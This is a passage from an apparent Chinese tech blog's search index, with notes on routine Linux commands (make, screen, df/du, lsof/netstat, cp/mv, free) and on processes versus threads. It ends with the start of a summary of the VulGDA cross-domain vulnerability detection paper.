      <categories>
          
          <category> Vulnerabilities </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnerabilities </tag>
            
            <tag> VulDataset </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux make编译浅入</title>
      <link href="/2024/04/18/Programmer/linux/make%20(copy)/"/>
      <url>/2024/04/18/Programmer/linux/make%20(copy)/</url>
      
        <content type="html"><![CDATA[<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">make是用来编译的，它从Makefile中读取指令，然后编译。</span><br><span class="line"></span><br><span class="line">make install是用来安装的，它也从Makefile中读取指令，安装到指定的位置。</span><br><span class="line">make 的作用是开始进行源代码编译，以及一些功能的提供，这些功能由他的 Makefile 设置文件提供相关的功能。</span><br><span class="line">比如 make install 一般表示进行安装，make uninstall 是卸载，不加参数就是默认的进行源代码编译。</span><br><span class="line"></span><br><span class="line">最常见的几个目标：</span><br><span class="line"></span><br><span class="line">make all：编译程序、库、文档等（等同于make）</span><br><span class="line"></span><br><span class="line">make install：安装已经编译好的程序。复制文件树中到文件到指定的位置</span><br><span class="line"></span><br><span class="line">make unistall：卸载已经安装的程序。</span><br><span class="line"></span><br><span class="line">make clean：删除由make命令产生的文件</span><br><span class="line"></span><br><span class="line">make distclean：删除由./configure产生的文件</span><br><span class="line"></span><br><span class="line">make check：测试刚刚编译的软件（某些程序可能不支持）</span><br><span class="line"></span><br><span class="line">make installcheck：检查安装的库和程序（某些程序可能不支持）</span><br><span class="line"></span><br><span class="line">make dist：重新打包成packname-version.tar.gz</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 顺序执行多行命令</title>
      <link href="/2024/04/18/Programmer/linux/Linux%E9%A1%BA%E5%BA%8F%E6%89%A7%E8%A1%8C%E5%A4%9A%E8%A1%8C%E5%91%BD%E4%BB%A4/"/>
      <url>/2024/04/18/Programmer/linux/Linux%E9%A1%BA%E5%BA%8F%E6%89%A7%E8%A1%8C%E5%A4%9A%E8%A1%8C%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<p>在终端执行Linux命令时，有时需要顺序执行多行命令，每行命令的执行时间可能会很长时间，如果人为的逐条输入执行则会非常麻烦和不确定，也会很浪费时间。</p><p>这时，就需要Linux顺序执行多行命令了，命令之间需要用连接符连接，不同的连接符有不同的效果，具体如下：</p><ul><li>分号；——没有任何逻辑关系的连接符。当多个命令用分号连接时，各命令之间的执行成功与否彼此没有任何影响，都会一条一条执行下去。</li><li>逻辑或|| ——当用此连接符连接多个命令时，前面的命令执行成功，则后面的命令不会执行。前面的命令执行失败，后面的命令才会执行。</li><li>逻辑与&amp;&amp; ——当用此连接符连接多个命令时，前面的命令执行成功，才会执行后面的命令，前面的命令执行失败，后面的命令不会执行，与 || 正好相反。</li><li>管道符| ——当用此连接符连接多个命令时，前面命令执行的正确输出，会交给后面的命令继续处理。若前面的命令执行失败，则会报错，若后面的命令无法处理前面命令的输出，也会报错。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 恢复使用rm命令删除的文件</title>
      <link href="/2024/04/18/Programmer/linux/rm%E6%81%A2%E5%A4%8D/"/>
      <url>/2024/04/18/Programmer/linux/rm%E6%81%A2%E5%A4%8D/</url>
      
        <content type="html"><![CDATA[<h1 id="linux恢复使用rm命令删除的文件">linux恢复使用rm命令删除的文件</h1><p>linux的文件被rm命令删除是可以通过linux自带的文件恢复工具debugfs来恢复的。</p><h5 id="1查看当前系统版本号及文件系统格式">1.查看当前系统版本号及文件系统格式</h5><p><img src="https:////upload-images.jianshu.io/upload_images/12988464-6d7dfeaa88e9494f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/872/format/webp" alt="img"></p><p>image.png</p><h5 id="2-使用debugfs来恢复">2. 使用debugfs来恢复。</h5><p>1）打开被删除文件所在的分区<br>2）用ls -d显示被删除的文件<br>3）执行logdump –i 命令<br>4）退出</p><p><img src="https:////upload-images.jianshu.io/upload_images/12988464-ba74286891e4ef91.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/645/format/webp" alt="img"></p><p>image.png</p><h5 id="3执行dd命令">3.执行dd命令</h5><p>其中bs对应上面offset的值，skip对应上面block的值</p><p><img src="https:////upload-images.jianshu.io/upload_images/12988464-377e9c18782391e6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/886/format/webp" alt="img"></p><p>image.png</p><h5 id="4恢复成功">4.恢复成功</h5><p>作者：日常采坑君<br>链接：<a href="https://www.jianshu.com/p/43aa40a5609e">https://www.jianshu.com/p/43aa40a5609e</a><br>来源：简书<br>著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>screen会话</title>
      <link href="/2024/04/18/Programmer/linux/screen/"/>
      <url>/2024/04/18/Programmer/linux/screen/</url>
      
        <content type="html"><![CDATA[<p>在Linux和类Unix系统中，<code>screen</code>命令是一个非常强大的终端复用器，它允许用户在一个单一的物理终端上启动多个会话，并在它们之间进行切换。使用<code>screen</code>，你可以在一个会话中运行程序，然后断开连接，之后又重新连接到同一个会话，程序会继续运行。</p><p>以下是一些基本的<code>screen</code>命令和选项：</p><ul><li><code>screen</code>：启动一个新的screen会话。</li><li><code>screen -S &lt;session_name&gt;</code>：创建一个名为<code>&lt;session_name&gt;</code>的新会话。</li><li><code>screen -r &lt;session_name&gt;</code>：重新连接到名为<code>&lt;session_name&gt;</code>的会话。</li><li><code>screen -r -D &lt;session_name&gt;</code>：重新连接到会话，如果会话不存在，则创建它。</li><li><code>screen -ls</code>：列出所有现有的screen会话。</li><li><code>screen -x &lt;session_name&gt;</code>：将当前终端窗口附加到指定的会话。</li><li><code>Ctrl-A D</code>：从当前会话中分离，即使会话中有活动的程序，它们也会继续运行。</li><li><code>Ctrl-A \</code>：切换到下一个会话。</li><li><code>Ctrl-A Ctrl-A</code>：切换回之前的会话。</li></ul><p><code>screen</code>还支持多个窗口（通过<code>Ctrl-A S</code>创建），标签页（通过<code>Ctrl-A Tab</code>切换），以及复制和粘贴文本等功能。这些功能使得<code>screen</code>成为远程服务器管理和长时间运行程序的理想工具。</p><p>请注意，<code>screen</code>的默认快捷键前缀是<code>Ctrl-A</code>，但这个前缀可以被配置为其他组合键，以避免与终端模拟器的快捷键冲突。</p><p>我们在<a href="https://so.csdn.net/so/search?q=%E5%91%BD%E4%BB%A4%E8%A1%8C&amp;spm=1001.2101.3001.7020">命令行</a>执行模型的训练或者其他工作时, 常常需要挂起程序很长时间, 这中间窗口关闭会影响程序的执行. 使用screen可以方便的管理多个命令行工作流, 而不必担心彼此的影响. 这里简单介绍一下最常用的几个命令.</p><h4 id="1-启动新的screen会话">1. 启动新的<a href="https://so.csdn.net/so/search?q=screen%E4%BC%9A%E8%AF%9D&amp;spm=1001.2101.3001.7020">screen会话</a>:</h4><blockquote><p># 创建名为name的会话</p><p>screen -S name</p><p># 创建一个会话, 系统自动命名(形如:XXXX.pts-53.ubuntu)</p><p>screen</p></blockquote><h4 id="2-退出当前screen会话">2. 退出当前screen会话:</h4><blockquote><p>按:Ctrl+a, 再按:d, 即可退出screen, 此时,程序仍在后台执行;</p></blockquote><h4 id="3-查看当前已有的screen会话">3. 查看当前已有的screen会话:</h4><blockquote><p>输入:screen -ls;</p></blockquote><h4 id="4-进入某个会话">4. 进入某个会话:</h4><blockquote><p>输入:screen -r 程序进程ID, 返回程序执行进程;</p></blockquote><h4 id="5-窗口操作">5. 窗口操作:</h4><blockquote><p>Ctrl+a+w: 展示当前会话中的所有窗口;</p><p>Ctrl+a+c: 创建新窗口;</p><p>Ctrl+a+n: 切换至下一个窗口;</p><p>Ctrl+a+p: 切换至上一个窗口;</p><p>Ctrl+a+num: 切换至编号为num的窗口;</p><p>Ctrl+a+k: 杀死当前窗口;</p></blockquote><h4 id="6-删除某个会话">6. 删除某个会话:</h4><blockquote><p>screen -S your_screen_name -X quit</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> screen </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux硬盘占用情况</title>
      <link href="/2024/04/18/Programmer/linux/%E6%9F%A5%E7%9C%8B%E7%A1%AC%E7%9B%98%E5%8D%A0%E7%94%A8/"/>
      <url>/2024/04/18/Programmer/linux/%E6%9F%A5%E7%9C%8B%E7%A1%AC%E7%9B%98%E5%8D%A0%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>在Linux系统中，查看硬盘占用情况可以通过多种命令行工具来完成。以下是一些常用的命令：</p><ol><li><p><strong><code>df</code> 命令</strong>： <code>df</code>（Disk File System）命令用于显示文件系统的磁盘空间使用情况。使用<code>-h</code>参数可以以易读的格式（如MB、GB）显示信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df -h</span><br></pre></td></tr></table></figure></li><li><p><strong><code>du</code> 命令</strong>： <code>du</code>（Disk Usage）命令用于估算文件或目录的磁盘空间使用量。结合<code>-h</code>参数也可以以易读的格式显示，而<code>-s</code>参数可以提供指定目录的总大小。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">du -sh /path/to/directory</span><br></pre></td></tr></table></figure></li><li><p><strong><code>ncdu</code> 命令</strong>： <code>ncdu</code>（NCurses Disk Usage）是一个基于文本的用户界面工具，用于交互式地查看磁盘使用情况。它需要单独安装。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncdu /path/to/directory</span><br></pre></td></tr></table></figure></li><li><p><strong><code>lsblk</code> 命令</strong>： <code>lsblk</code> 命令列出所有可用的块设备（如硬盘驱动器和分区）及其挂载点。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsblk</span><br></pre></td></tr></table></figure></li><li><p><strong><code>fdisk</code> 命令</strong>： <code>fdisk</code> 是一个磁盘分区表操作工具，也可以用来查看磁盘分区信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo fdisk -l</span><br></pre></td></tr></table></figure></li><li><p><strong><code>iostat</code> 命令</strong>： <code>iostat</code> 命令用于监视系统输入/输出设备负载，包括磁盘。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iostat</span><br></pre></td></tr></table></figure></li><li><p><strong><code>df</code> 和 <code>du</code> 结合使用</strong>： 有时候，<code>df</code> 显示的磁盘使用情况与 <code>du</code> 不一致，这可能是由于文件系统级别的差异或删除文件后未释放空间等原因。在这种情况下，可以使用以下命令来诊断：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">du -x --max-depth=1 / | sort -h</span><br></pre></td></tr></table></figure><p>这将显示当前目录下每个子目录的磁盘使用情况，按大小排序。</p></li><li><p><strong>检查挂载点</strong>： 如果系统中有多个挂载点，您可以检查每个挂载点的磁盘使用情况：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df -h | grep -v &#x27;^Filesystem&#x27;</span><br></pre></td></tr></table></figure></li></ol><p>请注意，某些命令（如<code>fdisk</code>）可能需要管理员权限，因此在使用时可能需要在前面加上<code>sudo</code>。此外，根据您的Linux发行版和个人配置，某些命令可能需要单独安装。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux 查看端口占用情况 - lsof 和 netstat</title>
      <link href="/2024/04/18/Programmer/linux/%E7%AB%AF%E5%8F%A3/"/>
      <url>/2024/04/18/Programmer/linux/%E7%AB%AF%E5%8F%A3/</url>
      
        <content type="html"><![CDATA[<p>Linux 查看端口占用情况可以使用 <strong>lsof</strong> 和 <strong>netstat</strong> 命令。</p><hr><h2 id="lsof">lsof</h2><p>lsof(list open files)是一个列出当前系统打开文件的工具。</p><p>lsof 查看端口占用语法格式：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -i:端口号</span><br></pre></td></tr></table></figure><h3 id="实例">实例</h3><p>查看服务器 8000 端口的占用情况：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># lsof -i:8000</span></span><br><span class="line">COMMAND   PID USER   FD   TYPE   DEVICE SIZE/OFF NODE NAME</span><br><span class="line">nodejs  26993 root   10u  IPv4 37999514      0t0  TCP *:8000 (LISTEN)</span><br></pre></td></tr></table></figure><p>可以看到 8000 端口已经被轻 nodejs 服务占用。</p><p>lsof -i 需要 root 用户的权限来执行，如下图：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404252154661.png" alt="img"></p><p>更多 lsof 的命令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">lsof -i:8080：查看8080端口占用</span><br><span class="line">lsof abc.txt：显示开启文件abc.txt的进程</span><br><span class="line">lsof -c abc：显示abc进程现在打开的文件</span><br><span class="line">lsof -c -p 1234：列出进程号为1234的进程所打开的文件</span><br><span class="line">lsof -g gid：显示归属gid的进程情况</span><br><span class="line">lsof +d /usr/local/：显示目录下被进程开启的文件</span><br><span class="line">lsof +D /usr/local/：同上，但是会搜索目录下的目录，时间较长</span><br><span class="line">lsof -d 4：显示使用fd为4的进程</span><br><span class="line">lsof -i -U：显示所有打开的端口和UNIX domain文件</span><br></pre></td></tr></table></figure><hr><h2 id="netstat">netstat</h2><p><strong>netstat -tunlp</strong> 用于显示 tcp，udp 的端口和进程等相关情况。</p><p>netstat 查看端口占用语法格式：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tunlp | grep 端口号</span><br></pre></td></tr></table></figure><ul><li>-t (tcp) 仅显示tcp相关选项</li><li>-u (udp)仅显示udp相关选项</li><li>-n 拒绝显示别名，能显示数字的全部转化为数字</li><li>-l 仅列出在Listen(监听)的服务状态</li><li>-p 显示建立相关链接的程序名</li></ul><p>例如查看 8000 端口的情况，使用以下命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># netstat -tunlp | grep 8000</span></span><br><span class="line">tcp        0      0 0.0.0.0:8000            0.0.0.0:*               LISTEN      26993/nodejs   </span><br></pre></td></tr></table></figure><p>更多命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">netstat -ntlp   //查看当前所有tcp端口</span><br><span class="line">netstat -ntulp | grep 80   //查看所有80端口使用情况</span><br><span class="line">netstat -ntulp | grep 3306   //查看所有3306端口使用情况</span><br></pre></td></tr></table></figure><hr><h2 id="kill">kill</h2><p>在查到端口占用的进程后，如果你要杀掉对应的进程可以使用 kill 命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">kill</span> -9 PID</span><br></pre></td></tr></table></figure><p>如上实例，我们看到 8000 端口对应的 PID 为 26993，使用以下命令杀死进程：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">kill</span> -9 26993</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux查看内存</title>
      <link href="/2024/04/18/Programmer/linux/%E5%86%85%E5%AD%98/"/>
      <url>/2024/04/18/Programmer/linux/%E5%86%85%E5%AD%98/</url>
      
        <content type="html"><![CDATA[<h2 id="linux查看内存多大的方法">linux查看内存多大的方法</h2><p><strong>1、*<em>执行<code>free -h，显示内存单位</code>*</em></strong></p><p><em><strong>*<img src="mdPics/1833183-20220614105509494-1828936676.png" alt="img">*</strong></em></p><p><strong>2、执行<code>free -m</code></strong></p><p><code>free -m</code> 以 MB 为单位，显示内存使用情况。</p><p><img src="mdPics/1649761750694282.png" alt="1.png"></p><p>free 命令用来显示系统内存状态，包括系统物理内存、虚拟内存（swap 交换分区）、共享内存和系统缓存的使用情况，其输出和 top 命令的内存部分非常相似。</p><p><code>free -m</code>命令输出列表中，第一行显示的是各个列的列表头信息，各自的含义如下所示：</p><ul><li>total 是总内存数；</li><li>used 是已经使用的内存数；</li><li>free 是空闲的内存数；</li><li>shared 是多个进程共享的内存总数；</li><li>buffers 是缓冲内存数；</li><li>cached 是缓存内存数。</li></ul><p>Mem 一行指的是内存的使用情况；-/buffers/cache 的内存数，相当于第一行的 used-buffers-cached。+/buffers/cache 的内存数，相当于第一行的 free+buffers+cached；Swap 一行指的就是 swap 分区的使用情况。</p><p>可以看到，系统的物理内存为 7741 MB，已经使用了 5623 MB，空闲 1560 MB。而 swap 分区总大小为 7935 MB，目前使用528 MB。</p><p><strong>2、执行<code>cat /proc/meminfo</code></strong></p><p><code>cat /proc/meminfo</code>查看linux系统内存大小的详细信息，可以查看总内存，剩余内存、可使用内存等信息。</p><p><img src="mdPics/1649761686421217.png" alt="2.png"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux复制或移动文件</title>
      <link href="/2024/04/18/Programmer/linux/%E5%A4%8D%E5%88%B6%E6%88%96%E7%A7%BB%E5%8A%A8%E6%96%87%E4%BB%B6/"/>
      <url>/2024/04/18/Programmer/linux/%E5%A4%8D%E5%88%B6%E6%88%96%E7%A7%BB%E5%8A%A8%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h3 id="复制或移动文件到另一个目录">复制或移动文件到另一个目录</h3><p>1、将一个文件夹下的所有内容复制到另一个文件夹下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> -r /home/packageA/* /home/cp/packageB/</span><br><span class="line">或</span><br><span class="line"><span class="built_in">cp</span> -r /home/packageA/. /home/cp/packageB/</span><br></pre></td></tr></table></figure><p>这两种方法效果是一样的。</p><p>2、将一个文件夹复制到另一个文件夹下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> -r /home/packageA    /home/packageB</span><br></pre></td></tr></table></figure><p>运行命令之后packageB文件夹下就有packageA文件夹了。</p><p>3、删除一个文件夹及其下面的所有文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">rm</span> -r  /home/packageA</span><br></pre></td></tr></table></figure><p>4、移动一个文件夹到另一个文件夹下面</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> /home/packageA /home/packageB/</span><br><span class="line">或</span><br><span class="line"><span class="built_in">mv</span> /home/packageA /home/packageB</span><br></pre></td></tr></table></figure><p>这两种方法效果是一样的。</p><p>如果是移动文件夹下的所有文件的话就可以文件夹后面跟上 /*</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> /home/packageA/* /home/packageB/</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>进程与线程</title>
      <link href="/2024/04/18/Programmer/linux/%E8%BF%9B%E7%A8%8B/"/>
      <url>/2024/04/18/Programmer/linux/%E8%BF%9B%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="线程的基本概念">线程的基本概念</h3><p>线程是进程中执行运算的最小单位，是进程中的一个实体，是被系统独立调度和分派的基本单位，线程自己不拥有系统资源，只拥有一点在运行中必不可少的资源，但它可与同属一个进程的其它线程共享进程所拥有的全部资源。一个线程可以创建和撤销另一个线程，同一进程中的多个线程之间可以并发执行。</p><p>好处 ：</p><p>（1）易于调度。</p><p>（2）提高并发性。通过线程可方便有效地实现并发性。进程可创建多个线程来执行同一程序的不同部分。</p><p>（3）开销少。创建线程比创建进程要快，所需开销很少。。</p><p>（4）利于充分发挥多处理器的功能。通过创建多线程进程，每个线程在一个处理器上运行，从而实现应用程序的并发性，使每个处理器都得到充分运行。</p><p>从用户的角度来看，进程是正在运行的程序实例，而线程是进程中真正执行任务的基本单位。也就是说一个运行的程序至少包含一个进程，一个进程至少包含一个线程，线程不能独立于进程而存在。</p><h3 id="进程">进程</h3><p>进程(Process)是操作系统分配资源的基本单位，一个进程拥有的资源有自己的堆、栈、虚存空间(页表)、文件描述符等信息。从编程的角度来理解进程，可以把它看作是一个类或一个 PCB(Process Control Block)进程控制块的结构体，这个结构体中大致包含以下几个内容：</p><p>1.进程编号 PID：进程的身份标识。</p><p>2.进程的状态：</p><ul><li>新建状态</li><li>就绪状态</li><li>运行状态</li><li>阻塞状态</li><li>销毁状态</li></ul><p>3.执行优先级</p><p>4.上下文：保存本次执行状态，以便下次继续执行，这个过程就是一个上下文。</p><p>5.内存地址</p><h3 id="线程">线程</h3><p>线程(Thread)是操作系统能够进行运算调度的基本单位。它包含在进程中，是进程中的实际运行单位。在 Unix System V 及 SunOS 中线程也被称为轻量进程(lightweight processes)，但轻量进程更多指内核线程(kernel thread)，而把用户线程(user thread)称为线程。</p><p>PS：用户线程可以理解为应用程序自己的线程，由程序员创建并控制的线程;而内核线程是内核支持并使用的线程。</p><h3 id="线程优势">线程优势</h3><p>线程是轻量级的进程，一个进程中包含了多个线程，因此多个线程间可以共享进程资源，线程和进程的关系如下图所示：</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202404252155438.png" alt="img"></p><p>其中，堆和方法区是可以共享的区域，而程序计数器和栈是每个线程私有的。</p><ul><li>程序计数器是一块内存区域，用来记录线程当前要执行的指令地址。</li><li>栈是用来记录每个线程自己的局部变量的。</li><li>堆中存放的是当前程序创建的所有对象。</li><li>方法区存放的是常量和静态变量等信息。</li></ul><h3 id="进程和线程的区别">进程和线程的区别</h3><p>进程和线程的区别主要体现在以下几点。</p><ul><li>区别1：从属关系不同从属关系不同：</li></ul><p>进程是正在运行程序的实例，进程中包含了线程，而线程中不能包含进程。</p><ul><li>区别2：描述侧重点不同描述侧重点不同：</li></ul><p>进程是操作系统分配资源的基本单位，而线程是操作系统调度的基本单位。</p><ul><li>区别3：共享资源不同共享资源不同：</li></ul><p>多个进程间不能共享资源，每个进程有自己的堆、栈、虚存空间(页表)、文件描述符等信息，而线程可以共享进程资源文件(堆和方法区)。</p><ul><li>区别4：上下文切换速度不同上下文切换速度不同：</li></ul><p>线程上下文切换速度很快(上下文切换指的是从一个线程切换到另一个线程)，而进程的上下文切换的速度比较慢。</p><p>区别5：操纵者不同操纵者不同：</p><p>一般情况下进程的操纵者是操作系统，而线程的操纵者是编程人员。</p><h3 id="总结">总结</h3><p>进程是操作系统分配资源的基本单位，而线程是操作系统调度的基本单位。一个进程中至少包含一个线程，线程不能独立于进程而存在。进程不能共享资源，而线程可以。线程可以看作是轻量级的进程，它们的主要区别体现在：从属关系、描述侧重点、共享资源、上下文切换速度和操纵对象等不同。</p><p>线程和进程的区别在于,子进程和父进程有不同的代码和数据空间,而多个线程则共享数据空间,每个线程有自己的执行堆栈和程序计数器为其执行上下文.多线程主要是为了节约CPU时间,发挥利用,根据具体情况而定. 线程的运行中需要使用计算机的内存资源和CPU。</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cross-domain vulnerability detection using graph embedding and domain adaptation</title>
      <link href="/2023/12/19/Papers/Vul/Cross-domain%20vulnerability%20detection%20using%20graph%20embedding%20and%20domain%20adaptation/"/>
      <url>/2023/12/19/Papers/Vul/Cross-domain%20vulnerability%20detection%20using%20graph%20embedding%20and%20domain%20adaptation/</url>
      
        <content type="html"><![CDATA[<p>a山东省计算机网络重点实验室，山东省计算机科学中心（济南国家超级计算机中心），齐鲁工业大学（山东科学院），济南250014，中国b北京邮电大学网络空间安全学院，北京100876，中国c公共大数据国家重点实验室，贵州大学计算机科学与技术学院，贵阳550025</p><h1 id="0-abstract">0 Abstract</h1><p>漏洞检测是维护网络空间安全的有效手段。机器学习方法由于其准确性和自动化的优势，在软件安全领域引起了人们的广泛关注。<strong>然而，目前的研究主要集中在训练数据和测试数据属于同一域的域内漏洞检测上。<strong>由于应用场景、编码习惯等因素，不同软件项目中的漏洞可能服从不同的概率分布。当机器学习方法应用于一个全新的项目时，这种差异会影响它们的性能。为了解决这个冷启动问题，我们</strong>提出了一个使用图嵌入和深度域自适应（VulGDA）的跨域漏洞检测框架。<strong>它以多种跨域方式工作，包括</strong>零样本方式</strong>，即目标域中没有标记数据可用于训练。将VulGDA分解为图嵌入和域自适应。在图嵌入阶段，我们将源代码中的样本转换为图表示，其中元素根据其语法和语义关系直接连接。然后，我们将来自图中定义的邻居和边的信息聚合为实值向量。通过图形嵌入，VulGDA提取了全面的漏洞特征，并解决了长期依赖性的挑战。针对训练数据和测试数据之间的差异，使用域自适应来训练特征生成器。该特征生成器将嵌入的图映射到一个“深层”特征，该特征对漏洞检测具有鉴别性，并且对域之间的移动保持不变。我们进行了一项系统实验来验证VulGDA的有效性。结果表明，将图嵌入和深域自适应相结合，提高了VulGDA在跨域漏洞检测中的性能。与最先进的方法相比，我们的方法在冷启动条件下具有更好的性能。</p><h1 id="1-contributions">1 Contributions</h1><p>主要问题就是目前的研究针对某一数据集或是某些特定的漏洞，没有在跨域问题上提出适当的解决方法；</p><ul><li><p>提出了一个结合了图嵌入和域自适应的跨域漏洞检测框架VulGDA，VulGDA以ZeroShot方式工作，这是跨域检测中最严格的方式。VulGDA通过将目标域中的监督信息添加到训练数据中，也适用于few-shot和域内方式。</p></li><li><p>提出了一种提取综合漏洞特征的图嵌入方法；减少噪声对漏洞特征的影响</p></li><li><p>提出了一种神经网络来学习特征生成器。该特征生成器通过减少分类损失和域差异来进行优化。最后，该特征生成器将学习到的源域中的漏洞模式传输到目标域。</p></li><li><p>实现了一个原型并进行了系统的实验。结果表明，图嵌入和域自适应的应用提高了VulGDA的性能。与现有方法相比，VulGDA在跨域漏洞检测方面取得了更好的性能。</p></li></ul><h1 id="2-method">2 Method</h1><p>VulGDA旨在检测现实世界软件中的漏洞。为了实用，本文考虑了最严格的条件。也就是说，应用在源域中训练的检测模型来检测目标域中的漏洞，并且该模型在训练期间无法从目标域获得任何监督信息（零样本）。这一假设使VulGDA具有良好的泛化能力，并易于应用于其他跨域检测情况，例如历史漏洞数据很少（很少发生）或丰富（Indomain）的项目。</p><p><img src="https://foresta.oss-cn-beijing.aliyuncs.com/images/202312191701536.png" alt="image-20231219170117488"></p><p>问题定义：假设我们的检测架构可以访问源域中的标记数据集<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>S</mi><mo>=</mo><mo stretchy="false">{</mo><mo stretchy="false">(</mo><msub><mi>x</mi><mi>i</mi></msub><mo separator="true">,</mo><msub><mi>y</mi><mi>i</mi></msub><mo stretchy="false">)</mo><msubsup><mo stretchy="false">}</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></msubsup><mo>∼</mo><mo stretchy="false">(</mo><msub><mi>D</mi><mi>s</mi></msub><msup><mo stretchy="false">)</mo><mi>n</mi></msup></mrow><annotation encoding="application/x-tex">S=\{(x_{i},y_{i})\}_{i=1}^{n}\sim(D_{s})^{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord 